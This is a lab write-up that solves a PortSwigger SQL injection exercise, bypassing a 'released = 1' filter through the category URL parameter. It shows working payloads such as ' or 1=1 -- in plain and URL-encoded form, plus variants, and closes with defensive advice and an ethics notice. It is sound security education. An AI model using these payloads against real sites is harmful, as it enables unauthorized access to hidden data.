# PortSwigger Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Lab type:** SQL Injection → WHERE clause bypass to retrieve hidden (unreleased) products  
**Goal:** Make the application display products that are **not released** yet (i.e., bypass `released = 1`).

---

## 🔎 Scenario
When selecting a category, the application issues a backend query like:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

The URL reflects the chosen category:
```
/filter?category=Pets
```
which results in:
```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1;
```

The `released = 1` predicate ensures only **published** items are shown. Our objective is to **retrieve hidden (unreleased) items** by removing or neutralizing this filter with a SQL injection in the `category` parameter.

---

## ✅ Vulnerability Check
A quick syntax-breaker using a single quote (`'`) confirms unsanitized input:

```
/filter?category='
```

This produces a server error (e.g., *Internal Server Error*), consistent with a malformed query such as:
```sql
SELECT * FROM products WHERE category = ''' AND released = 1;
```

This indicates the `category` value is injected into the SQL literal without proper escaping or parameterization.

---

## 🧪 Comment Test (Non-disruptive)
Use a trailing SQL comment to validate control of the query tail:

**Payload:**
```
'--
```
*(Some environments require a space: `'-- `)*

**Effect:**
```sql
SELECT * FROM products WHERE category = '' -- ' AND released = 1;
```

Everything after `--` is ignored, preventing syntax errors and confirming query manipulation.

> ℹ️ In some DBMS (e.g., MySQL), `#` can also start a single-line comment. Standard SQL uses `--` (double hyphen + space).

---

## 🎯 Goal-Oriented Exploit
To return unreleased products, neutralize the `AND released = 1` condition and force a truthy predicate:

**Final Payload (URL-encoded shown below):**
```
'or 1=1 -- 
```
URL-encoded example:
```
%27or%201%3D1%20--%20
```

**Resulting query:**
```sql
SELECT * FROM products 
WHERE category = '' OR 1=1 -- ' AND released = 1;
```

**Why it works:**
- `'` closes the original string literal.
- `OR 1=1` makes the `WHERE` clause evaluate to **TRUE** for all rows.
- `--` comments out the remainder, including `AND released = 1`.

This returns **all products**, including unreleased (hidden) ones, satisfying the lab objective.

---

## 🧩 Notes & Variations
- If the platform strictly requires a category to remain meaningful, you could also try:
  ```
  Pets' OR 1=1 -- 
  ```
  yielding:
  ```sql
  WHERE category = 'Pets' OR 1=1 --  AND released = 1
  ```
- Some databases require a trailing newline after `--` or a space: `-- `.
- Multi-line comments may also work in some contexts:
  ```
  '/*
  ```
  but single-line `--` is the most typical in PortSwigger SQLi labs.

---

## 🛡️ Defensive Takeaways (Blue-Team)
- **Always use parameterized queries / prepared statements.**  
- **Avoid string concatenation** for SQL; never directly interpolate user input.  
- **Apply server-side input validation and allowlisting.**  
- **Use least-privilege DB accounts** and monitor for anomalies (e.g., comments/boolean tautologies).  

---

## 📸 Screenshot Placeholders
Include screenshots in your repo if desired:
- `screenshots/1-error-on-single-quote.png` → Error after `'`  
- `screenshots/2-comment-validation.png` → No error with `'-- `  
- `screenshots/3-unreleased-products.png` → All products visible after `or 1=1 -- `

You can reference them in Markdown like:
```md
![Error after single quote](screenshots/1-error-on-single-quote.png)
![Comment validation](screenshots/2-comment-validation.png)
![Unreleased products shown](screenshots/3-unreleased-products.png)
```

---

## 🧾 Summary
- **Injection point:** `category` query parameter.
- **Goal:** Bypass `released = 1` filter.
- **Payload:** `'or 1=1 -- ` (URL-encode for reliability).
- **Outcome:** Application returns **all** products, including unreleased ones → **Lab solved** ✅

---

## ⚖️ Ethical Use
This write-up is for **educational purposes** in a safe, controlled lab environment (PortSwigger Web Security Academy). Do **not** test techniques on systems you don’t own or have explicit, written permission to assess.

